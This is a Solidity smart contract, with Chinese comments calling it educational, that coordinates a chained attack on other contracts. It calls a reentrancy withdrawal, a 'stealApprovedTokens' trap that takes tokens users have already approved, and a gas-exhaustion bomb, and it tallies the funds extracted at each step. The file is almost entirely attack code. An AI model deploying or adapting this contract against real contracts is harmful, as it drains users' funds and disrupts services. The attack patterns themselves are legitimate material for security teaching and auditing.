// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./backdoors/ReentrancyVulnerable.sol";
import "./phishing/ApproveTrap.sol";
import "./gas/GasAttack.sol";
import "./mev/MEVAttack.sol";

/**
 * @title FullChainAttack
 * @notice 全链攻击协调合约 - 演示多向量组合攻击
 * @dev 教育用途：展示攻击者如何串联多个漏洞进行最大化收益
 */
contract FullChainAttack {
    address public owner;
    uint256 public totalExtracted;

    struct AttackStep {
        string name;
        address target;
        uint256 profit;
        bool executed;
    }

    AttackStep[] public steps;
    mapping(string => bool) public completedSteps;

    event StepExecuted(string name, uint256 profit);
    event AttackCompleted(uint256 totalProfit);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 执行完整攻击链
     * @param reentrancyTarget 重入漏洞目标
     * @param approveTarget 授权陷阱目标
     * @param gasTarget Gas攻击目标
     */
    function executeFullChain(
        address reentrancyTarget,
        address approveTarget,
        address gasTarget
    ) external onlyOwner {
        // Step 1: 重入攻击提取资金
        _executeReentrancy(reentrancyTarget);

        // Step 2: 利用授权陷阱转移Token
        _executeApproveTrap(approveTarget);

        // Step 3: Gas耗尽攻击
        _executeGasAttack(gasTarget);

        emit AttackCompleted(totalExtracted);
    }

    function _executeReentrancy(address target) internal {
        ReentrancyVulnerable vuln = ReentrancyVulnerable(target);
        uint256 balance = address(vuln).balance;
        if (balance > 0) {
            vuln.withdraw();
            totalExtracted += balance;
            _recordStep("Reentrancy", target, balance);
        }
    }

    function _executeApproveTrap(address target) internal {
        ApproveTrap trap = ApproveTrap(target);
        // 如果用户已经授权，直接转移
        uint256 trapped = trap.stealApprovedTokens(address(this));
        if (trapped > 0) {
            totalExtracted += trapped;
            _recordStep("ApproveTrap", target, trapped);
        }
    }

    function _executeGasAttack(address target) internal {
        GasAttack gas = GasAttack(target);
        // 触发Gas耗尽逻辑
        gas.bomb{gas: 3000000}(1000);
        _recordStep("GasAttack", target, 0);
    }

    function _recordStep(string memory name, address target, uint256 profit) internal {
        steps.push(AttackStep(name, target, profit, true));
        completedSteps[name] = true;
        emit StepExecuted(name, profit);
    }

    function getSteps() external view returns (AttackStep[] memory) {
        return steps;
    }

    receive() external payable {}
}
